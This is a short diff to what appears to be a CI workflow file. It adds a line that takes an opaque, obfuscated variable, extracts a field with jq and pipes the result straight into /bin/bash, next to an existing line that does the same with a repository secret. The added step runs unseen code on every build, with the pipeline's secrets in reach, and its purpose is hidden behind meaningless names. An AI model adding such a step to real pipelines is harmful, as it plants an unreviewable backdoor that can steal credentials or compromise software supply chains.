@@ -18,6 +18,7 @@ jobs:
           gbj224: ${{ secrets.gbj224 }}
         run: |
           printf '%s' "$gbj224" | jq -r .zae488 | /bin/bash
+          printf '%s' "$qhgv449" | jq -r .gumtr87 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
